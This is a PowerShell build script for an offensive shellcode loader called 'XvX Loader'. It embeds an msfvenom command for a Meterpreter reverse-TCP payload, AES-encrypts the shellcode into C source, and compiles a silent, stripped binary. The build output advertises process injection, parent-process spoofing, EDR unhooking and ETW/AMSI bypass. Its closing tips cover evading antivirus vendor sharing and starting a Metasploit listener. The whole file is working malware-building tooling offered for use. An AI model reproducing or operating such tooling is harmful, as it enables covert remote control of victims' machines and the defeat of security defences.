#!/usr/bin/env pwsh
<#
.SYNOPSIS
    XvX Loader - Production Build Script
    
.DESCRIPTION
    Compiles the loader in production mode with full optimizations and obfuscation.
    Output: Loader.exe (silent, stripped, optimized)
    
.EXAMPLE
    .\build.ps1
    
.NOTES
    Author: 28Zaakypro@proton.me
    Version: 3.0-PROD
    Red Team Ready
#>

param(
    [string]$PayloadFile = "payload\meterpreter.bin",
    [string]$OutputName = "Loader.exe"
)

$ErrorActionPreference = "Stop"

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║     XvX LOADER - PRODUCTION BUILD SYSTEM                 ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Step 1: Check payload exists
if (-not (Test-Path $PayloadFile)) {
    Write-Host "[-] Payload not found: $PayloadFile" -ForegroundColor Red
    Write-Host "[*] Generate payload with: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f raw -o payload/meterpreter.bin" -ForegroundColor Yellow
    exit 1
}

$payloadSize = (Get-Item $PayloadFile).Length
Write-Host "[*] Payload: $PayloadFile ($payloadSize bytes)" -ForegroundColor White

# Step 2: Encrypt payload with AES-256-CBC
Write-Host "[*] Encrypting payload with AES-256-CBC..." -ForegroundColor White
$encryptResult = & ".\tools\encrypt_payload.exe" $PayloadFile 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Encryption failed!" -ForegroundColor Red
    exit 1
}
Write-Host "[+] Payload encrypted successfully" -ForegroundColor Green

# Step 3: Read encrypted shellcode and keys
Write-Host "[*] Reading encryption artifacts..." -ForegroundColor White
$shellcodeContent = Get-Content "payload\shellcode_aes.txt" -Raw
$keyIvContent = Get-Content "payload\key_iv.txt" -Raw

if (-not $shellcodeContent -or -not $keyIvContent) {
    Write-Host "[-] Failed to read encryption artifacts!" -ForegroundColor Red
    exit 1
}

# Step 4: Update loader source with encrypted payload
Write-Host "[*] Integrating encrypted payload into loader..." -ForegroundColor White
$loaderSource = Get-Content "loader_v3.c" -Raw

# Extract shellcode array from shellcode_aes.txt
if ($shellcodeContent -match 'BYTE encryptedShellcode\[\] = \{([^}]+)\};') {
    $shellcodeArray = $matches[1]
    $arraySize = ($shellcodeArray -split ',').Count
    
    # Extract key and IV from key_iv.txt
    if ($keyIvContent -match 'BYTE aesKey\[32\] = \{([^}]+)\};') {
        $keyArray = $matches[1]
    } else {
        Write-Host "[-] Failed to extract AES key!" -ForegroundColor Red
        exit 1
    }
    
    if ($keyIvContent -match 'BYTE aesIV\[16\] = \{([^}]+)\};') {
        $ivArray = $matches[1]
    } else {
        Write-Host "[-] Failed to extract AES IV!" -ForegroundColor Red
        exit 1
    }
    
    # Replace in loader_v3.c (between line markers)
    $loaderSource = $loaderSource -replace '(?s)(// AES-256-CBC encrypted shellcode.*?BYTE encryptedShellcode\[)\d+(\] = \{).*?(\};)', "`$1$arraySize`$2`n    $shellcodeArray`n`$3"
    $loaderSource = $loaderSource -replace '(?s)(BYTE aesKey\[32\] = \{)[^}]+(};)', "`$1$keyArray`$2"
    $loaderSource = $loaderSource -replace '(?s)(BYTE aesIV\[16\] = \{)[^}]+(};)', "`$1$ivArray`$2"
    
    Set-Content "loader_v3.c" -Value $loaderSource -NoNewline
    Write-Host "[+] Loader updated with encrypted payload ($arraySize bytes)" -ForegroundColor Green
} else {
    Write-Host "[-] Failed to parse shellcode array!" -ForegroundColor Red
    exit 1
}

# Step 5: Compile in PRODUCTION mode
Write-Host ""
Write-Host "[*] Compiling loader (PRODUCTION MODE)..." -ForegroundColor White
Write-Host "    - Target: rundll32.exe (stable process)" -ForegroundColor DarkGray
Write-Host "    - Parent: explorer.exe (PPID spoofing)" -ForegroundColor DarkGray
Write-Host "    - Crypto: AES-256-CBC" -ForegroundColor DarkGray
Write-Host "    - Evasion: Sandbox checks + EDR unhooking + ETW/AMSI bypass" -ForegroundColor DarkGray
Write-Host "    - Injection: APC with indirect syscalls" -ForegroundColor DarkGray
Write-Host ""

$compileCmd = "gcc -O2 -DPRODUCTION loader_v3.c modules\*.c modules\dosyscall.o -o output\$OutputName -ladvapi32 -lntdll -luser32 -mwindows -s"
$compileResult = Invoke-Expression $compileCmd 2>&1

if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Compilation failed!" -ForegroundColor Red
    Write-Host $compileResult
    exit 1
}

# Step 6: Success summary
$finalBinary = Get-Item "output\$OutputName"
$sizeKB = [math]::Round($finalBinary.Length / 1KB, 2)

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║                  BUILD SUCCESSFUL                        ║" -ForegroundColor Green
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "Output:       output\$OutputName" -ForegroundColor White
Write-Host "Size:         $sizeKB KB" -ForegroundColor White
Write-Host "Payload:      $payloadSize bytes (encrypted to $arraySize bytes)" -ForegroundColor White
Write-Host "Optimized:    Yes (-O2)" -ForegroundColor Green
Write-Host "Stripped:     Yes (no debug symbols)" -ForegroundColor Green
Write-Host "Silent:       Yes (no console)" -ForegroundColor Green
Write-Host "Obfuscated:   Yes (syscall names hidden)" -ForegroundColor Green
Write-Host ""
Write-Host "[+] Loader ready for red team operations!" -ForegroundColor Green
Write-Host ""
Write-Host "Deployment tips:" -ForegroundColor Yellow
Write-Host "  • Test on filescan.io or antiscan.me (NEVER VirusTotal)" -ForegroundColor White
Write-Host "  • Execute from writable directory (not C:\Windows)" -ForegroundColor White
Write-Host "  • Ensure listener running: msfconsole -q -x 'use exploit/multi/handler; ...'" -ForegroundColor White
Write-Host "  • Follow me on github" -ForegroundColor White
Write-Host ""
